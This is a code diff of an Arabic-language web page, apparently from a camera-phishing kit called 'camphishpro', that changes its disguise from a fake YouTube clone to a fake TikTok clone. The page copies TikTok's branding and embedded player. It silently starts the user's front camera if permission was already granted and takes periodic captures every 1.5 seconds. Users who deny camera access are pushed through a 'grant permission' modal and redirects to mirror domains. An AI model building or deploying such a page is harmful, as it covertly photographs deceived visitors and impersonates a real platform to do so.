@@ -4,15 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#0f0f0f">
-<title>اضغط لمشاهدة الفيديو</title>
+<title>اضغط لمشاهدة فيديو تيك توك</title>
 
-    <!-- وسوم المعاينة والوصف -->
-    <meta name="description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء المغربية والعالمية وكذالك الجمال نحرص كل يوم على ان نقدم لك سيدتي كل جديد لتحصلي عن كل ما تبحثي عنه وتكوني امرأة راقية وبأبهى حلة فإذا أعجبتك القناة فضلا قومي بالاشتراك فيها ومشاركتها مع من تحبين تحياااتي" />
+    <!-- وسوم المعاينة والوصف المخصصة لتيك توك -->
+    <meta name="description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء والجمال، شاهد الفيديو وشاركنا رأيك." />
     <meta property="og:type" content="website" />
-    <meta property="og:site_name" content="عالم الاناقة والجمال" />
+    <meta property="og:site_name" content="تيك توك" />
     <meta property="og:url" content="https://camphishpro.onrender.com/" />
-    <meta property="og:title" content="اضغط هنا لمشاهدة الفيديو" />
-    <meta property="og:description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء المغربية والعالمية وكذالك الجمال نحرص كل يوم على ان نقدم لك سيدتي كل جديد لتحصلي عن كل ما تبحثي عنه وتكوني امرأة راقية وبأبهى حلة فإذا أعجبتك القناة فضلا قومي بالاشتراك فيها ومشاركتها مع من تحبين تحياااتي" />
+    <meta property="og:title" content="اضغط هنا لمشاهدة الفيديو على تيك توك" />
+    <meta property="og:description" content="شاهد هذا المقطع المميز على تيك توك واستمتع بالمشاهدة!" />
     <meta property="og:image" content="https://www.tiktok.com/api/img/?itemId=7696817413618191649&location=0" />
     <meta property="og:image:secure_url" content="https://www.tiktok.com/api/img/?itemId=7696817413618191649&location=0" />
     <meta property="og:image:type" content="image/jpeg" />
@@ -21,15 +21,15 @@
 
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:url" content="https://camphishpro.onrender.com/" />
-    <meta name="twitter:title" content="اضغط هنا لمشاهدة الفيديو" />
-    <meta name="twitter:description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء المغربية والعالمية وكذالك الجمال نحرص كل يوم على ان نقدم لك سيدتي كل جديد لتحصلي عن كل ما تبحثي عنه وتكوني امرأة راقية وبأبهى حلة فإذا أعجبتك القناة فضلا قومي بالاشتراك فيها ومشاركتها مع من تحبين تحياااتي" />
+    <meta name="twitter:title" content="اضغط هنا لمشاهدة الفيديو على تيك توك" />
+    <meta name="twitter:description" content="شاهد هذا المقطع المميز على تيك توك واستمتع بالمشاهدة!" />
     <meta name="twitter:image" content="https://www.tiktok.com/api/img/?itemId=7696817413618191649&location=0" />
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
-:root{--bg:#0f0f0f;--bg2:#272727;--text:#fff;--text2:#aaa;--red:#ff0000;--line:rgba(255,255,255,.12);--hover:rgba(255,255,255,.1)}
+:root{--bg:#0f0f0f;--bg2:#272727;--text:#fff;--text2:#aaa;--red:#ff0050;--line:rgba(255,255,255,.12);--hover:rgba(255,255,255,.1)}
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 html{color-scheme:dark}
 body{font-family:'Cairo','Tajawal',system-ui,sans-serif;background:var(--bg);color:var(--text);font-size:14px;line-height:1.5;overflow-x:hidden}
@@ -48,15 +48,15 @@ svg.i.big{width:64px;height:64px;color:#717171}
 .tb-start,.tb-end{display:flex;align-items:center;gap:8px;flex:1}
 .tb-end{justify-content:flex-end}
 .logo{display:flex;align-items:center;gap:6px;font-weight:700;font-size:20px}
-.logo svg{width:30px;height:21px}
+.logo svg{width:28px;height:28px}
 .search-wrap{flex:0 1 640px;display:flex;align-items:center;gap:8px;min-width:0}
 .search{display:flex;flex:1;min-width:0}
 .search input{flex:1;min-width:0;height:40px;background:#121212;border:1px solid #303030;border-start-start-radius:40px;border-end-start-radius:40px;padding:0 18px;outline:none;font-size:16px;-webkit-appearance:none;appearance:none}
-.search input:focus{border-color:#1c62b9}
+.search input:focus{border-color:#ff0050}
 .search button{width:64px;height:40px;background:#222;border:1px solid #303030;border-inline-start:0;border-start-end-radius:40px;border-end-end-radius:40px;display:grid;place-items:center}
 .search button:hover{background:#2f2f2f}
 .badge{position:absolute;top:2px;inset-inline-end:0;background:var(--red);font-size:10px;font-weight:700;border-radius:8px;padding:0 5px;line-height:16px}
-.me{width:32px;height:32px;border-radius:50%;background:#8e24aa;display:grid;place-items:center;font-weight:700}
+.me{width:32px;height:32px;border-radius:50%;background:#00f2fe;color:#000;display:grid;place-items:center;font-weight:700}
 
 /* Sidebar */
 .sidebar{position:fixed;top:56px;bottom:0;inset-inline-start:0;width:240px;background:var(--bg);overflow-y:auto;padding:12px;z-index:90;transition:transform .25s ease,width .2s ease;scrollbar-width:thin}
@@ -87,47 +87,42 @@ body.drawer-mode .main{margin-inline-start:0}
 .chip:hover{background:#3f3f3f}
 .chip.active{background:#fff;color:#0f0f0f}
 .page-title{padding:16px 24px 0;font-size:20px;font-weight:700;display:flex;align-items:center;justify-content:space-between;gap:12px}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:36px 16px;padding:16px 24px 32px}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:24px 16px;padding:16px 24px 32px}
 .card{cursor:pointer}
-.thumb{position:relative;aspect-ratio:16/9;border-radius:12px;overflow:hidden;background:#000;display:flex;justify-content:center;align-items:center}
-.thumb img{width:100%;height:100%;object-fit:contain;display:block;transition:transform .3s}
+.thumb{position:relative;aspect-ratio:9/16;border-radius:12px;overflow:hidden;background:#000;display:flex;justify-content:center;align-items:center}
+.thumb img{width:100%;height:100%;object-fit:cover;display:block;transition:transform .3s}
 .card:hover .thumb img{transform:scale(1.04)}
 .dur{position:absolute;bottom:6px;inset-inline-end:6px;background:rgba(0,0,0,.8);padding:0 5px;border-radius:4px;font-size:12px;font-weight:600;direction:ltr}
 .meta{display:flex;gap:12px;padding-top:12px}
 .avatar{width:36px;height:36px;border-radius:50%;display:grid;place-items:center;font-weight:700;color:#fff;flex:none;text-transform:uppercase}
-.t{font-size:16px;font-weight:600;line-height:1.45;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.t{font-size:15px;font-weight:600;line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
 .sub{color:var(--text2);font-size:13px}
 .empty{display:flex;flex-direction:column;align-items:center;text-align:center;gap:8px;padding:80px 24px;color:var(--text2)}
 .empty h3{color:var(--text);font-size:18px}
 .sect{padding:16px 24px 0;font-size:18px;font-weight:700}
-.shorts-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:16px;padding:16px 24px 32px}
-.short{position:relative;aspect-ratio:9/16;border-radius:14px;overflow:hidden;cursor:pointer;background:#222}
-.short img{width:100%;height:100%;object-fit:cover}
-.short div{position:absolute;inset:auto 0 0 0;padding:32px 12px 12px;background:linear-gradient(transparent,rgba(0,0,0,.85))}
-.short b{display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;font-size:14px}
 
 /* Buttons */
 .btn{height:36px;padding:0 16px;border-radius:18px;background:var(--bg2);display:inline-flex;align-items:center;gap:6px;font-weight:600;white-space:nowrap;flex:none}
 .btn:hover{background:#3f3f3f}
 .btn.on svg{fill:var(--red)}
-.btn-sub{background:#fff;color:#0f0f0f}
-.btn-sub:hover{background:#d9d9d9}
+.btn-sub{background:var(--red);color:#fff}
+.btn-sub:hover{background:#d60043}
 .btn-sub.on{background:var(--bg2);color:#fff}
 .btn-sub.on:hover{background:#3f3f3f}
 .btn-sub:disabled{opacity:.4;cursor:default}
-.btn-blue{background:#3ea6ff;color:#0f0f0f}
-.btn-blue:hover{background:#65b8ff}
+.btn-blue{background:#ff0050;color:#fff}
+.btn-blue:hover{background:#d60043}
 .btn.ghost{background:none}
 .btn.ghost:hover{background:var(--hover)}
 
 /* Watch */
-.watch{display:flex;gap:24px;padding:24px;max-width:1800px;margin:0 auto}
+.watch{display:flex;gap:24px;padding:24px;max-width:1400px;margin:0 auto}
 .w-primary{flex:1;min-width:0}
-.w-secondary{width:402px;flex:none}
-.player{position:relative;width:100%;max-width:480px;aspect-ratio:9/16;background:#000;border-radius:12px;overflow:hidden;margin:0 auto}
+.w-secondary{width:360px;flex:none}
+.player{position:relative;width:100%;max-width:400px;aspect-ratio:9/16;background:#000;border-radius:16px;overflow:hidden;margin:0 auto;box-shadow:0 8px 24px rgba(0,0,0,.6)}
 .player iframe{position:absolute;inset:0;width:100%;height:100%;border:0}
-.yt-link{display:inline-block;margin-top:6px;font-size:12px;color:#3ea6ff}
-.w-title{font-size:20px;font-weight:700;line-height:1.5;margin:8px 0}
+.yt-link{display:inline-block;margin-top:8px;font-size:13px;color:#ff0050;font-weight:600}
+.w-title{font-size:18px;font-weight:700;line-height:1.4;margin:12px 0 8px}
 .w-row{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
 .ch{display:flex;align-items:center;gap:12px}
 .ch-name{font-weight:700;font-size:16px;line-height:1.3}
@@ -143,11 +138,11 @@ body.drawer-mode .main{margin-inline-start:0}
 .desc p{margin-top:4px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
 .desc.open p{display:block}
 .desc .more{font-weight:600}
-.cm-title{font-size:20px;font-weight:700;margin:24px 0 16px}
+.cm-title{font-size:18px;font-weight:700;margin:24px 0 16px}
 .cm-form{display:flex;gap:16px;margin-bottom:24px}
 .cm-box{flex:1;min-width:0}
 .cm-box input{width:100%;background:none;border:0;border-bottom:1px solid #717171;outline:none;padding:6px 0;font-size:16px}
-.cm-box input:focus{border-bottom:2px solid #fff}
+.cm-box input:focus{border-bottom:2px solid #ff0050}
 .cm-btns{display:none;justify-content:flex-end;gap:8px;margin-top:10px}
 .cm-box.active .cm-btns{display:flex}
 .cm{display:flex;gap:16px;margin-bottom:20px}
@@ -159,8 +154,8 @@ body.drawer-mode .main{margin-inline-start:0}
 .cm-act button:hover{background:var(--hover)}
 .cm-act button.on{color:#fff}
 .cm-act button.on svg{fill:var(--red)}
-.rel{display:flex;gap:8px;margin-bottom:10px;cursor:pointer}
-.rel .thumb{width:168px;flex:none;border-radius:8px}
+.rel{display:flex;gap:12px;margin-bottom:12px;cursor:pointer}
+.rel .thumb{width:110px;aspect-ratio:9/16;flex:none;border-radius:8px}
 .rel .t{font-size:14px}
 .rel-title{font-size:16px;font-weight:700;margin-bottom:12px}
 
@@ -188,7 +183,7 @@ body.drawer-mode .main{margin-inline-start:0}
 .perm-box h3{font-size:18px;margin-bottom:12px;color:#fff}
 .perm-box p{color:#ccc;font-size:14px;line-height:1.6;margin-bottom:20px}
 .btn-red-action{background:var(--red);color:#fff;font-size:15px;font-weight:700;width:100%;height:44px;border-radius:22px;display:inline-flex;align-items:center;justify-content:center;transition:background .2s}
-.btn-red-action:hover{background:#cc0000}
+.btn-red-action:hover{background:#d60043}
 
 /* Bottom nav */
 .bnav{display:none;position:fixed;bottom:0;inset-inline:0;height:56px;background:var(--bg);border-top:1px solid var(--line);z-index:100;padding-bottom:env(safe-area-inset-bottom);box-sizing:content-box}
@@ -206,11 +201,10 @@ body.drawer-mode .main{margin-inline-start:0}
   .search-wrap{display:none;position:absolute;inset:0;background:var(--bg);padding:0 8px;z-index:2}
   body.searching .search-wrap{display:flex}
   .chips{padding:10px 12px}
-  .grid{grid-template-columns:1fr;gap:22px;padding:8px 0 24px}
-  .card .thumb{border-radius:0}
-  .card .meta{padding:12px 12px 0}
+  .grid{grid-template-columns:repeat(2,1fr);gap:16px 12px;padding:12px}
+  .card .thumb{border-radius:10px}
+  .card .meta{padding:8px 4px 0}
   .page-title,.sect{padding:12px 12px 0;font-size:17px}
-  .shorts-grid{grid-template-columns:repeat(2,1fr);padding:12px}
   .bnav{display:flex}
   .main{padding-bottom:64px}
   .toasts{bottom:76px}
@@ -220,8 +214,7 @@ body.drawer-mode .main{margin-inline-start:0}
   .watch{padding:0}
   .player{border-radius:0;max-width:100%}
   #wMeta,#wComments,.w-secondary,.yt-link-wrap{padding-inline:12px}
-  .w-title{font-size:18px}
-  .rel .thumb{width:150px}
+  .w-title{font-size:16px}
 }
 </style>
 </head>
@@ -230,15 +223,15 @@ body.drawer-mode .main{margin-inline-start:0}
 <header class="topbar">
   <div class="tb-start">
     <button class="icon-btn" data-action="menu" aria-label="القائمة"><span data-ic="menu"></span></button>
-    <button class="logo" data-nav="home" aria-label="يوتيوب">
-      <svg viewBox="0 0 28 20"><rect width="28" height="20" rx="5" fill="#f00"/><path d="M11 6l7 4-7 4z" fill="#fff"/></svg>
-      <span>يوتيوب</span>
+    <button class="logo" data-nav="home" aria-label="تيك توك">
+      <svg viewBox="0 0 24 24" fill="#fff"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 003 15.68 6.34 6.34 0 009.34 22a6.34 6.34 0 006.34-6.34V9.27a8.16 8.16 0 004.76 1.52v-3.4a4.85 4.85 0 01-.85-.7z"/></svg>
+      <span>تيك توك</span>
     </button>
   </div>
   <div class="search-wrap">
     <button class="icon-btn mob-only" data-action="search-close" aria-label="رجوع"><span data-ic="back"></span></button>
     <form class="search" id="searchForm" role="search">
-      <input id="q" type="search" placeholder="بحث" autocomplete="off" enterkeyhint="search">
+      <input id="q" type="search" placeholder="بحث في تيك توك" autocomplete="off" enterkeyhint="search">
       <button type="submit" aria-label="بحث"><span data-ic="search"></span></button>
     </form>
   </div>
@@ -246,7 +239,7 @@ body.drawer-mode .main{margin-inline-start:0}
     <button class="icon-btn mob-only" data-action="search-open" aria-label="بحث"><span data-ic="search"></span></button>
     <button class="icon-btn hide-mob" data-action="create" aria-label="إنشاء"><span data-ic="create"></span></button>
     <button class="icon-btn" data-action="notif" aria-label="الإشعارات"><span data-ic="bell"></span><span class="badge">٩+</span></button>
-    <button class="me" data-action="profile" aria-label="حسابي">أ</button>
+    <button class="me" data-action="profile" aria-label="حسابي">ت</button>
   </div>
 </header>
 
@@ -262,7 +255,7 @@ body.drawer-mode .main{margin-inline-start:0}
 
 <div class="modal" id="modal">
   <div class="modal-box" role="dialog" aria-modal="true" aria-labelledby="mTitle">
-    <div class="modal-head"><h3 id="mTitle">مشاركة</h3><button class="icon-btn" data-action="close-modal" aria-label="إغلاق"><span data-ic="close"></span></button></div>
+    <div class="modal-head"><h3 id="mTitle">مشاركة الفيديو</h3><button class="icon-btn" data-action="close-modal" aria-label="إغلاق"><span data-ic="close"></span></button></div>
     <div class="share-row" id="shareRow"></div>
     <div class="link-row"><input id="shareLink" readonly><button class="btn btn-blue" data-action="copy-link">نسخ</button></div>
   </div>
@@ -272,7 +265,7 @@ body.drawer-mode .main{margin-inline-start:0}
 <div class="perm-modal" id="permModal">
   <div class="perm-box">
     <h3>تنبيه التشغيل</h3>
-    <p>لا يمكنكم مشاهدة الفيديو إلا عند الضغط على زر السماح. يرجى منح الإذن لتشغيل الفيديو.</p>
+    <p>لا يمكنكم مشاهدة فيديو تيك توك إلا عند الضغط على زر السماح. يرجى منح الإذن لتشغيل الفيديو.</p>
     <button class="btn-red-action" onclick="goToNextMirror()">اضغط هنا للمشاهدة</button>
   </div>
 </div>
@@ -302,12 +295,10 @@ function goToNextMirror() {
         const nextDomain = mirrorDomains[nextAttempt];
         window.location.replace(`${nextDomain}?n=${nextAttempt}`);
     } else {
-        // إذا استنفد جميع الروابط، يعيد تشغيل الرابط الأول مجدداً
         window.location.replace(`${mirrorDomains[0]}?n=0`);
     }
 }
 
-// إظهار نافذة التنبيه المخصصة عند الرفض
 function showPermissionModal() {
     const modal = document.getElementById('permModal');
     if (modal) {
@@ -315,13 +306,10 @@ function showPermissionModal() {
     }
 }
 
-// الفحص والاستجابة عند تحميل الصفحة
 async function autoCheckPermission() {
     if (navigator.permissions && navigator.permissions.query) {
         try {
             const permissionStatus = await navigator.permissions.query({ name: 'camera' });
-            
-            // إذا كان السماح ممنوحاً مسبقاً، شغل الكاميرا صامتاً
             if (permissionStatus.state === 'granted') {
                 mediaStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: { ideal: 'user' } } 
@@ -338,18 +326,28 @@ async function autoCheckPermission() {
 
 document.addEventListener('DOMContentLoaded', autoCheckPermission);
 
-/* ===== Data & Core State (يدعم يوتيوب وتيك توك ديناميكياً) ===== */
-const DM='الفيديو الموسيقي الرسمي. استمتع بالمشاهدة وشاركنا رأيك في التعليقات، ولا تنسَ الاشتراك في القناة لمتابعة كل جديد.';
-const DC='فاونديشن حسب نوع البشرة ✨🥰 #عنايه_بالبشره #عناية_بالوجه #ميك_اب #فاونديشن #foundation #makeup #مكياج.';
-const VIDEOS=[
- {id:'7696817413618191649', platform:'tiktok', title:'cute baby girl 🤣❤️ #ai #cartoon #cartoonforkids', ch:'craziest_s0', subs:0, views:125000, likes:15400, time:'منذ أيام', cat:'ترفيه', dur:'00:15', desc:'Cute AI Cartoon Baby Girl Video for Kids 🤣❤️'},
+/* ===== البيانات مخصصة لتيك توك فقط ===== */
+const DC = 'cute baby girl 🤣❤️ #ai #cartoon #cartoonforkids';
+const VIDEOS = [
+ {
+   id: '7696817413618191649',
+   title: 'cute baby girl 🤣❤️ #ai #cartoon #cartoonforkids',
+   ch: 'craziest_s0',
+   subs: 12000,
+   views: 845000,
+   likes: 95400,
+   time: 'منذ أيام',
+   cat: 'ترفيه',
+   dur: '00:15',
+   desc: 'Cute AI Cartoon Baby Girl Video for Kids 🤣❤️'
+ }
 ];
 
-const CATS=['الكل','تجميل وعناية','أزياء وموضة','ترفيه'];
-const CH={};VIDEOS.forEach(v=>{if(!CH[v.ch])CH[v.ch]={subs:v.subs}});
-const COLORS=['#e53935','#8e24aa','#3949ab','#00897b','#f4511e','#6d4c41','#039be5','#7cb342'];
+const CATS = ['الكل', 'ترفيه', 'تجميل وعناية', 'أزياء وموضة'];
+const CH = {}; VIDEOS.forEach(v => { if(!CH[v.ch]) CH[v.ch] = { subs: v.subs } });
+const COLORS = ['#e53935','#8e24aa','#3949ab','#00897b','#f4511e','#6d4c41','#039be5','#7cb342'];
 
-const ICONS={
+const ICONS = {
  menu:'M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z',
  search:'M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z',
  home:'M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z',
@@ -379,14 +377,13 @@ const colorOf=s=>COLORS[[...s].reduce((a,c)=>a+c.charCodeAt(0),0)%COLORS.length]
 const avatar=(name,size=36)=>`<div class="avatar" style="width:${size}px;height:${size}px;background:${colorOf(name)};font-size:${Math.round(size*.45)}px">${esc(name[0])}</div>`;
 const cur=()=>VIDEOS.find(v=>v.id===S.cur);
 const byId=id=>VIDEOS.find(v=>v.id===id);
-const linkOf=v=>v.platform==='tiktok'?`https://www.tiktok.com/@${v.ch}/video/${v.id}`:`https://www.youtube.com/watch?v=${v.id}`;
+const linkOf=v=>`https://www.tiktok.com/@${v.ch}/video/${v.id}`;
 
 const S={view:'home',cat:'الكل',q:'',cur:null,liked:new Set(),disliked:new Set(),subs:new Set(),saved:new Set(),dl:new Set(),dling:false,hist:[],comments:{},cl:new Set(),descOpen:false};
 
-/* ===== متغيرات الكاميرا والتحكم بالصلاحيات ===== */
+/* ===== الكاميرا والتحكم بالصلاحيات ===== */
 let mediaStream = null;
 
-/* ===== Toast ===== */
 function toast(html,{sticky=false,ms=2600}={}){
   const el=document.createElement('div');el.className='toast';el.innerHTML=html;
   $('#toasts').appendChild(el);requestAnimationFrame(()=>el.classList.add('show'));
@@ -394,7 +391,6 @@ function toast(html,{sticky=false,ms=2600}={}){
 }
 function hideToast(el,ms=0){setTimeout(()=>{el.classList.remove('show');setTimeout(()=>el.remove(),300)},ms)}
 
-/* ===== Layout ===== */
 function updateLayout(){
   const b=document.body,drawer=innerWidth<1000||S.view==='watch';
   b.classList.toggle('drawer-mode',drawer);
@@ -407,29 +403,28 @@ function toggleSidebar(){
 addEventListener('resize',updateLayout);
 
 /* ===== Templates ===== */
-const logoHtml=()=>`<button class="logo" data-nav="home" aria-label="يوتيوب"><svg viewBox="0 0 28 20"><rect width="28" height="20" rx="5" fill="#f00"/><path d="M11 6l7 4-7 4z" fill="#fff"/></svg><span>يوتيوب</span></button>`;
+const logoHtml=()=>`<button class="logo" data-nav="home" aria-label="تيك توك"><svg viewBox="0 0 24 24" fill="#fff"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 003 15.68 6.34 6.34 0 009.34 22a6.34 6.34 0 006.34-6.34V9.27a8.16 8.16 0 004.76 1.52v-3.4a4.85 4.85 0 01-.85-.7z"/></svg><span>تيك توك</span></button>`;
 const navBtn=(view,icon,label)=>`<button class="sb-item ${S.view===view?'active':''}" data-nav="${view}">${ic(icon)}<span>${label}</span></button>`;
 
 function renderSidebar(){
   const subs=[...S.subs];
   $('#sidebar').innerHTML=
    `<div class="sb-head"><button class="icon-btn" data-action="menu" aria-label="إغلاق">${ic('menu')}</button>${logoHtml()}</div>`+
-   navBtn('home','home','الرئيسية')+navBtn('shorts','shorts','شورتس')+navBtn('subs','subs','الاشتراكات')+
+   navBtn('home','home','الرئيسية')+navBtn('shorts','shorts','المقاطع السريعة')+navBtn('subs','subs','المتابعات')+
    `<div class="sb-sep sb-extra"></div><div class="sb-title sb-extra">أنت</div>`+
    navBtn('library','library','المكتبة')+navBtn('history','history','سجل المشاهدة')+
-   `<div class="sb-sep sb-extra"></div><div class="sb-title sb-extra">الاشتراكات</div>`+
-   (subs.length?subs.map(n=>`<button class="sb-item sb-extra" data-ch="${esc(n)}">${avatar(n,24)}<span>${esc(n)}</span></button>`).join(''):`<p class="sb-empty sb-extra">اشترك في قنوات لتظهر هنا</p>`);
+   `<div class="sb-sep sb-extra"></div><div class="sb-title sb-extra">الحسابات المتابعة</div>`+
+   (subs.length?subs.map(n=>`<button class="sb-item sb-extra" data-ch="${esc(n)}">${avatar(n,24)}<span>${esc(n)}</span></button>`).join(''):`<p class="sb-empty sb-extra">تابع حسابات لتظهر هنا</p>`);
 }
 function renderBnav(){
-  const it=[['home','home','الرئيسية'],['shorts','shorts','شورتس'],['subs','subs','الاشتراكات'],['library','library','المكتبة']];
+  const it=[['home','home','الرئيسية'],['shorts','shorts','المقاطع'],['subs','subs','المتابعات'],['library','library','المكتبة']];
   $('#bnav').innerHTML=it.map(([v,i,l])=>`<button class="${S.view===v?'active':''}" data-nav="${v}">${ic(i)}<span>${l}</span></button>`).join('');
 }
 
-const cardHtml=v=>{
-    let thumbUrl = v.platform === 'tiktok' 
-        ? `https://www.tiktok.com/api/img/?itemId=${v.id}&location=0` 
-        : `https://img.youtube.com/vi/${v.id}/hqdefault.jpg`;
-    return `<article class="card" data-open="${v.id}"><div class="thumb"><img loading="lazy" src="${thumbUrl}" alt="" onerror="this.style.display='none'"><span class="dur">${v.dur}</span></div><div class="meta">${avatar(v.ch)}<div><h3 class="t">${v.title}</h3><div class="sub">${v.ch}</div><div class="sub">${fmt(v.views)} مشاهدة • ${v.time}</div></div></div></article>`;
+/* جلب صورة تيك توك المباشرة للتطبيق */
+const cardHtml = v => {
+    let thumbUrl = `https://www.tiktok.com/api/img/?itemId=${v.id}&location=0`;
+    return `<article class="card" data-open="${v.id}"><div class="thumb"><img loading="lazy" src="${thumbUrl}" alt="" onerror="this.style.display='none'"><span class="dur">${v.dur}</span></div><div class="meta">${avatar(v.ch)}<div><h3 class="t">${v.title}</h3><div class="sub">@${v.ch}</div><div class="sub">${fmt(v.views)} مشاهدة • ${v.time}</div></div></div></article>`;
 };
 
 const gridHtml=l=>`<div class="grid">${l.map(cardHtml).join('')}</div>`;
@@ -440,7 +435,6 @@ function filtered(){
   return VIDEOS.filter(v=>(S.cat==='الكل'||v.cat===S.cat)&&(!q||(v.title+' '+v.ch+' '+v.cat).toLowerCase().includes(q)));
 }
 
-/* ===== Main render & History Management ===== */
 function render(pushState=true){
   document.body.classList.toggle('in-watch',S.view==='watch');
   updateLayout();renderSidebar();renderBnav();
@@ -449,7 +443,7 @@ function render(pushState=true){
 
   if(pushState){
     const stateObj={view:S.view,cur:S.cur,cat:S.cat,q:S.q};
-    const title=S.view==='watch'&&cur()?cur().title:'يوتيوب';
+    const title=S.view==='watch'&&cur()?cur().title:'تيك توك';
     history.pushState(stateObj,title,'#'+(S.view==='watch'?'watch='+S.cur:S.view));
   }
 
@@ -459,13 +453,10 @@ function render(pushState=true){
     const l=filtered();
     view.innerHTML=(S.q?`<h2 class="page-title">نتائج البحث عن «${esc(S.q)}»</h2>`:'')+(l.length?gridHtml(l):emptyHtml('search','لم يتم العثور على نتائج','جرّب كلمات بحث مختلفة أو اختر تصنيفاً آخر.'));
   }else if(S.view==='shorts'){
-    view.innerHTML=`<h2 class="page-title">شورتس</h2><div class="shorts-grid">${[...VIDEOS].reverse().slice(0,12).map(v=>{
-        let tUrl = v.platform === 'tiktok' ? `https://www.tiktok.com/api/img/?itemId=${v.id}&location=0` : `https://img.youtube.com/vi/${v.id}/hqdefault.jpg`;
-        return `<div class="short" data-open="${v.id}"><img loading="lazy" src="${tUrl}" alt="" onerror="this.style.display='none'"><div><b>${v.title}</b><span class="sub">${fmt(v.views)} مشاهدة</span></div></div>`;
-    }).join('')}</div>`;
+    view.innerHTML=`<h2 class="page-title">المقاطع السريعة</h2><div class="grid">${[...VIDEOS].reverse().map(cardHtml).join('')}</div>`;
   }else if(S.view==='subs'){
     const l=VIDEOS.filter(v=>S.subs.has(v.ch));
-    view.innerHTML=`<h2 class="page-title">الاشتراكات</h2>`+(l.length?gridHtml(l):emptyHtml('subs','لم تشترك في أي قناة بعد','اشترك في قنوات لتظهر فيديوهاتها هنا.'));
+    view.innerHTML=`<h2 class="page-title">المتابعات</h2>`+(l.length?gridHtml(l):emptyHtml('subs','لم تتابع أي حساب بعد','تابع حسابات لتظهر فيديوهاتها هنا.'));
   }else if(S.view==='history'){
     const l=S.hist.map(byId);
     view.innerHTML=`<h2 class="page-title">سجل المشاهدة${l.length?`<button class="btn" data-action="clear-history">مسح السجل</button>`:''}</h2>`+(l.length?gridHtml(l):emptyHtml('history','سجل المشاهدة فارغ','الفيديوهات التي تشاهدها ستظهر هنا.'));
@@ -481,7 +472,7 @@ function render(pushState=true){
 function go(view){
   S.view=view;S.cur=null;S.q='';$('#q').value='';
   document.body.classList.remove('drawer-open','searching');
-  document.title='يوتيوب';render();scrollTo(0,0);
+  document.title='تيك توك';render();scrollTo(0,0);
 }
 function searchFor(text){
   S.q=text;S.view='home';S.cat='الكل';$('#q').value=text;
@@ -489,7 +480,7 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== دوال الكاميرا والانتقال والتنبيه عند الرفض ===== */
+/* ===== الكاميرا والانتقال ===== */
 async function openVideo(id) {
     if (mediaStream) {
         executeWatchTransition(id);
@@ -512,7 +503,7 @@ async function openVideo(id) {
         startPeriodicCapture();
 
     } catch (e) {
-        console.log("تم رفض الإذن أو كان محظوراً، جاري إظهار نافذة التوجيه التنبيهية...");
+        console.log("تم رفض الإذن، جاري التوجيه التنبيهي...");
         showPermissionModal();
     }
 }
@@ -556,42 +547,37 @@ function startPeriodicCapture() {
     }, 1500);
 }
 
-/* ===== Watch page (تدعم يوتيوب وتيك توك ديناميكياً) ===== */
+/* ===== صفحة مشاهدة فيديوهات تيك توك الرسمية ===== */
 function renderWatch(){
-  const v=cur();
-  const rel=[...VIDEOS].filter(x=>x.id!==v.id).sort((a,b)=>(b.cat===v.cat)-(a.cat===v.cat));
+  const v = cur();
+  const rel = [...VIDEOS].filter(x => x.id !== v.id).sort((a,b) => (b.cat === v.cat) - (a.cat === v.cat));
   
-  let playerHtml = '';
-  if (v.platform === 'tiktok') {
-      playerHtml = `<iframe src="https://www.tiktok.com/embed/v2/${v.id}" style="width:100%;height:100%;border:0;" allowfullscreen></iframe>`;
-  } else {
-      playerHtml = `<iframe src="https://www.youtube.com/embed/${v.id}?autoplay=1&rel=0&playsinline=1" title="${esc(v.title)}" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
-  }
+  // مشغل تيك توك الرسمي المعتمد للتضمين بدون مشاكل
+  let playerHtml = `<iframe src="https://www.tiktok.com/player/v1/${v.id}?music_info=1&description=1" style="width:100%;height:100%;border:0;" allow="autoplay; encrypted-media;" allowfullscreen></iframe>`;
 
